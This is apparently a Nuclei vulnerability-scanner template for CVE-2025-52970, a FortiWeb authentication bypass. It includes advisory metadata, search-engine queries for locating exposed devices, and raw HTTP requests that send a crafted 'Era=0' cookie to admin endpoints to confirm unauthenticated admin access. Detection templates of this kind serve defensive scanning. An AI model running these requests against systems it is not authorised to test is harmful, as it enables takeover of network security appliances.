id: CVE-2025-52970

info:
  name: Fortinet FortiWeb - Authentication Bypass
  author: princechaddha
  severity: critical
  description: |
    Fortinet FortiWeb <= 7.6.3, <= 7.4.7, <= 7.2.10, and <= 7.0.10 contain a broken access control caused by improper handling of parameters, letting unauthenticated remote attackers with non-public device info gain admin privileges via crafted requests. The vulnerability exploits improper handling of the "Era" cookie parameter, allowing attackers to force the system to use an all-zero cryptographic key, enabling the forging of authentication cookies.
  impact: |
    Successful exploitation allows unauthenticated remote attackers to impersonate any active user, including administrators, potentially leading to full administrative access and system compromise.
  remediation: |
    Upgrade to FortiWeb 7.6.4 or later, 7.4.8 or later, 7.2.11 or later, or 7.0.11 or later.
  reference:
    - https://pwner.gg/blog/2025-08-13-fortiweb-cve-2025-52970
    - https://github.com/Hex00-0x4/FortiWeb-CVE-2025-52970-Authentication-Bypass
    - https://fortiguard.fortinet.com/psirt/FG-IR-25-152
    - https://nvd.nist.gov/vuln/detail/CVE-2025-52970
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2025-52970
    cwe-id: CWE-287
    epss-score: 0.95000
    epss-percentile: 0.99900
    cpe: cpe:2.3:a:fortinet:fortiweb:*:*:*:*:*:*:*:*
  metadata:
    verified: true
    max-request: 3
    vendor: fortinet
    product: fortiweb
    shodan-query:
      - ssl:"cn=fortiweb"
      - title:"FortiWeb - "
    fofa-query:
      - title="FortiWeb"
      - cert="fortiweb"
    google-query: intitle:"FortiWeb"
  tags: cve,cve2025,fortinet,fortiweb,auth-bypass,unauth,kev

variables:
  marker: "{{rand_base(8)}}"

http:
  # Step 1: Check for FortiWeb login page and extract CSRF token
  - method: GET
    path:
      - "{{BaseURL}}/login"
      - "{{BaseURL}}/logincheck"
      - "{{BaseURL}}/admin"

    matchers:
      - type: word
        part: body
        words:
          - "FortiWeb"
          - "Fortinet"
        condition: or
        internal: true

    extractors:
      - type: regex
        part: body
        group: 1
        name: csrf_token
        internal: true
        regex:
          - 'name="csrfmiddlewaretoken" value="([^"]*)"'
          - 'csrf_token["\s]*[:=]["\s]*([^"]*)'

      - type: regex
        part: body
        group: 1
        name: session_id
        internal: true
        regex:
          - 'JSESSIONID=([^;]*)'

  # Step 2: Attempt authentication bypass using crafted Era cookie with all-zero key
  - raw:
      - |
        GET /api/v2.0/system/status HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
        Cookie: Era=0; JSESSIONID={{session_id}}; csrftoken={{csrf_token}}
        X-CSRF-Token: {{csrf_token}}
        Accept: application/json

      - |
        POST /api/v2.0/system/admin/setting HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
        Content-Type: application/json
        Cookie: Era=0; JSESSIONID={{session_id}}; csrftoken={{csrf_token}}
        X-CSRF-Token: {{csrf_token}}
        Accept: application/json
        Content-Length: 2
        
        {}

  # Step 3: Test direct admin access with forged authentication
  - raw:
      - |
        GET /admin/config HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
        Cookie: Era=0; admin_session=admin; auth_token=00000000000000000000000000000000
        Accept: text/html,application/xhtml+xml,application/xml

    stop-at-first-match: true

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200

      - type: word
        part: body
        words:
          - "FortiWeb"
          - "admin"
          - "configuration"
          - "system"
          - "policy"
          - "dashboard"
        condition: and

      - type: word
        part: body
        words:
          - "login"
          - "authentication required"
          - "unauthorized"
          - "access denied"
        condition: or
        negative: true

    extractors:
      - type: regex
        part: body
        group: 1
        regex:
          - '"version":"([^"]*)"'
          - 'FortiWeb-([0-9]+\.[0-9]+\.[0-9]+)'
          - 'Version: ([0-9]+\.[0-9]+\.[0-9]+)'

      - type: regex
        part: response
        regex:
          - 'Set-Cookie: ([^;]*)'

# Enhanced detection flow: Login page check + Era cookie bypass + Admin access verification
flow: http(1) && (http(2) || http(3))

# digest: 4a0a00473045022100e4926249ae6d859471f12beefef0234c1854a8ada72c91a9400eda6bf2797ac0022047450a63e6ae2ed04ef48c05372958b32e98a9a3263841531154ad5e2c435eda:922c64590222798bb761d5b6d8e72950
